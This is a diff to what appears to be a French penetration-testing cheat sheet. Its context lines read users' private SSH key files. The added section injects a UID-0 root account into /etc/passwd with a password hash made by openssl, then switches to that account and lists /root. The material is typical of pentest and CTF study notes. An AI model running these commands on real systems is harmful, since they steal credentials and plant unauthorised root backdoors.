@@ -349,6 +349,13 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
     cat home/user/.ssh/id_ecdsa_sk
     cat home/user/.ssh/id_ed25519
     cat home/user/.ssh/id_ed25519_sk
+    
+ **Injection de compte root dans /etc/passwd**
+ 
+    openssl passwd -1 mdp123
+    echo 'tim:$1$cNCh34ba$5KLgSZbxX0baUnEB66yoZ1:0:0:/root/:/bin/bash' >> /etc/passwd
+    su tim
+    ls /root
 
 ## Bruteforcing
 
